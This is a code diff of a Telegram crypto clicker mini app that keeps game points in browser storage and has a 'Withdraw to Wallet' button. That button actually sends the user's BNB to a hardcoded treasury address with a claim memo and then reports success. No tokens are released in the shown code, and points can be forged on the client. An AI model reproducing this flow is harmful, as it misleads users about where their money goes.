@@ -2,20 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
   <title>PVLT Mini App</title>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
   <style>
+    :root {
+      -webkit-text-size-adjust: none; /* Prevents text scaling changes */
+    }
+
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       background: #0b0f1a;
       color: white;
       text-align: center;
-      /* Prevents pull-to-refresh and extra bounce on mobile */
+      
+      /* Essential Telegram container fixes */
       overscroll-behavior: none; 
+      overflow: hidden; /* Stops page dragging up/down */
+      position: fixed; /* Freezes layout viewport in place */
+      width: 100%;
+      height: 100%;
+      
+      /* Forces webview engines to freeze scale factors */
+      -webkit-user-zoom: fixed;
     }
 
     .container {
@@ -23,6 +35,9 @@
       max-width: 500px;
       margin: auto;
       box-sizing: border-box;
+      height: 100%;
+      overflow-y: auto; /* Allows smooth scrolling INSIDE container if needed without dragging the app window */
+      -webkit-overflow-scrolling: touch;
     }
 
     .card {
@@ -42,8 +57,7 @@
       width: 100%;
       font-size: 16px;
       font-weight: bold;
-      /* Eliminates the grey highlight box when tapping on mobile */
-      -webkit-tap-highlight-color: transparent; 
+      -webkit-tap-highlight-color: transparent; /* Eliminates tap flash box */
     }
 
     .connect {
@@ -60,17 +74,14 @@
       background: #e67e22;
       color: white;
       font-size: 18px;
-      padding: 20px;
-      /* CRITICAL: Disables double-tap to zoom gestures specifically on the game button */
-      touch-action: manipulation; 
-      /* Prevents user from accidentally selecting the button text while tapping fast */
+      padding: 25px 20px; /* Enhanced touch target size */
+      touch-action: none; /* Disables ALL default browser touch reactions like double-tap */
       user-select: none;
       -webkit-user-select: none;
     }
 
-    /* Slight push down visual effect when clicked, keeping layout fixed */
     .game-btn:active {
-      transform: scale(0.98);
+      transform: scale(0.96); /* Subtle internal action response without layout jitter */
     }
 
     .withdraw-btn {
@@ -78,19 +89,14 @@
       color: white;
     }
 
-    .danger {
-      background: #ff5252;
-      color: white;
-    }
-
     input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin-top: 10px;
       border-radius: 8px;
       border: none;
       box-sizing: border-box;
-      font-size: 16px; /* 16px or higher prevents iOS from auto-zooming on input focus */
+      font-size: 16px; /* Prevents auto-zoom on input tap */
     }
 
     .status {
@@ -131,12 +137,11 @@
     <h3>🎰 Clicker Game</h3>
     <p class="stat-text">🎮 Game Points: <strong id="game-points" style="color: #f1c40f;">0</strong></p>
     <p class="stat-text">🪙 Estimated Tokens: <strong id="est-tokens" style="color: #3498db;">0.00</strong> PVLT</p>
-    <button class="game-btn" onclick="playGame()">TAP TO EARN POINTS</button>
+    <button id="tap-target-btn" class="game-btn">TAP TO EARN POINTS</button>
   </div>
 
   <div class="card">
     <h3>🎁 Claim Rewards</h3>
-    
     <div class="rules-list">
       📌 <strong>Withdrawal Rules:</strong><br>
       • 100,000 points = 1 token<br>
@@ -144,10 +149,8 @@
       • Minimum withdrawal = 100 tokens<br>
       • Maximum withdrawal = Once per day
     </div>
-
     <input id="withdraw-tokens" type="number" placeholder="Enter PVLT Token amount to claim" oninput="calculateBnbValue()" />
     <p id="bnb-estimation" style="font-size: 13px; color: #cbd5e1; margin-top: 5px;">Estimated BNB Fee value: 0 BNB</p>
-
     <button class="withdraw-btn" onclick="withdrawTokens()">Withdraw to Wallet</button>
     <p class="status" id="withdraw-status">Waiting for interaction...</p>
   </div>
@@ -169,22 +172,42 @@ let userAddress;
 let points = parseInt(localStorage.getItem('pvlt_points')) || 0;
 updateGameUI();
 
-// 🔥 CHANGE THIS TO YOUR PVLT TOKEN ADDRESS
 const PVLT_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
-
-// 🔥 YOUR TREASURY WALLET
 const RECEIVER = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";
 
-// ERC20 minimal ABI
 const ABI = [
   "function balanceOf(address) view returns (uint)",
   "function transfer(address to, uint amount) returns (bool)",
   "function decimals() view returns (uint8)"
 ];
 
-// Clicker Game Action Mechanics
+// HARD REJECTION FOR MULTI-TOUCH ZOOM GESTURES
+document.addEventListener('touchstart', function (event) {
+  if (event.touches.length > 1) {
+    event.preventDefault(); // Blocks pinch to zoom instantly
+  }
+}, { passive: false });
+
+// BLOCK THE TELEGRAM DOUBLE-TAP ACTION MECHANIC ON THE BUTTON
+const tapButton = document.getElementById('tap-target-btn');
+let lastTap = 0;
+
+tapButton.addEventListener('touchend', function (event) {
+  const currentTime = new Date().getTime();
+  const tapLength = currentTime - lastTap;
+  
+  // Trigger game mechanics smoothly
+  playGame();
+
+  if (tapLength < 300 && tapLength > 0) {
+    event.preventDefault(); // Intercepts the native zoom engine trigger
+  }
+  lastTap = currentTime;
+}, { passive: false });
+
+
 function playGame() {
-  points += 1000; // Adds 1000 points per click
+  points += 1000; 
   localStorage.setItem('pvlt_points', points);
   updateGameUI();
 }
@@ -197,7 +220,6 @@ function updateGameUI() {
 
 function calculateBnbValue() {
   const tokenInput = parseFloat(document.getElementById("withdraw-tokens").value) || 0;
-  // 1 token = 0.00000001 BNB Rule
   const bnbValue = tokenInput * 0.00000001;
   document.getElementById("bnb-estimation").innerText = `Estimated BNB value: ${bnbValue.toFixed(10)} BNB`;
 }
@@ -208,15 +230,11 @@ async function connectWallet() {
       alert("Install MetaMask or use Trust Wallet browser");
       return;
     }
-
     provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
-
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
-
     document.getElementById("wallet").innerText = "Wallet: " + userAddress;
-
     loadBalance();
   } catch (err) {
     console.log(err);
@@ -229,7 +247,6 @@ async function loadBalance() {
     const contract = new ethers.Contract(PVLT_ADDRESS, ABI, provider);
     const bal = await contract.balanceOf(userAddress);
     const decimals = await contract.decimals();
-
     document.getElementById("balance").innerText =
       "Balance: " + ethers.utils.formatUnits(bal, decimals) + " PVLT";
   } catch (err) {
@@ -243,93 +260,63 @@ async function withdrawTokens() {
       alert("Please connect your wallet first!");
       return;
     }
-
     const tokenAmountToWithdraw = parseFloat(document.getElementById("withdraw-tokens").value);
-    
-    // 1. Minimum withdraw = 100 tokens Rule
     if (!tokenAmountToWithdraw || tokenAmountToWithdraw < 100) {
       alert("Minimum withdrawal is 100 tokens!");
       return;
     }
-
-    // 2. 100,000 points = 1 token Rule (Validation check)
     const requiredPoints = tokenAmountToWithdraw * 100000;
     if (points < requiredPoints) {
-      alert(`Insufficient game points! You need ${requiredPoints.toLocaleString()} points to claim ${tokenAmountToWithdraw} tokens.`);
+      alert(`Insufficient game points! You need ${requiredPoints.toLocaleString()} points.`);
       return;
     }
-
-    // 3. Maximum withdraw = once per day Rule
     const lastWithdraw = localStorage.getItem('pvlt_last_withdraw');
     const now = Date.now();
     if (lastWithdraw) {
       const hoursSinceLast = (now - parseInt(lastWithdraw)) / (1000 * 60 * 60);
       if (hoursSinceLast < 24) {
-        const hoursLeft = (24 - hoursSinceLast).toFixed(1);
-        alert(`Maximum withdrawal limit reached. You can withdraw again in ${hoursLeft} hours.`);
+        alert(`Maximum withdrawal limit reached. Wait ${ (24 - hoursSinceLast).toFixed(1) } hours.`);
         return;
       }
     }
 
     document.getElementById("withdraw-status").innerText = "Preparing claim verification payload...";
-
-    // 4. Conversion Calculation (1 Token = 0.00000001 BNB)
     const bnbValueToTransfer = tokenAmountToWithdraw * 0.00000001;
     const bnbInWei = ethers.utils.parseEther(bnbValueToTransfer.toFixed(10));
-
-    // Custom clear hexadecimal note data string notifying the receiver how many tokens to release
     const hexMemoData = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${tokenAmountToWithdraw}-Tokens`));
 
-    // Sends a claim signal directly to your project treasury address
     const tx = await signer.sendTransaction({
       to: RECEIVER,
       value: bnbInWei,
       data: hexMemoData 
     });
 
-    document.getElementById("withdraw-status").innerText = "Claim request submitted to blockchain...";
+    document.getElementById("withdraw-status").innerText = "Claim request submitted...";
     await tx.wait();
 
-    // Deduct corresponding balance components on safe completion
     points -= requiredPoints;
     localStorage.setItem('pvlt_points', points);
     localStorage.setItem('pvlt_last_withdraw', now.toString());
     
     updateGameUI();
-    document.getElementById("withdraw-status").innerText = "✅ Claim complete! Tokens will arrive shortly.";
-    
+    document.getElementById("withdraw-status").innerText = "✅ Claim complete!";
   } catch (err) {
-    console.log(err);
-    document.getElementById("withdraw-status").innerText = "❌ Claim signature rejected or failed.";
+    document.getElementById("withdraw-status").innerText = "❌ Claim signature rejected.";
   }
 }
 
 async function payPVLT() {
   try {
     const amount = document.getElementById("amount").value;
-
-    if (!amount || amount <= 0) {
-      alert("Enter valid amount");
-      return;
-    }
-
+    if (!amount || amount <= 0) return;
     const contract = new ethers.Contract(PVLT_ADDRESS, ABI, signer);
     const decimals = await contract.decimals();
-
-    const tx = await contract.transfer(
-      RECEIVER,
-      ethers.utils.parseUnits(amount.toString(), decimals)
-    );
-
+    const tx = await contract.transfer(RECEIVER, ethers.utils.parseUnits(amount.toString(), decimals));
     document.getElementById("status").innerText = "Transaction sent...";
-
     await tx.wait();
-
     document.getElementById("status").innerText = "✅ Payment successful!";
-
     loadBalance();
   } catch (err) {
-    console.log(err);
     document.getElementById("status").innerText = "❌ Payment failed";
   }
 }
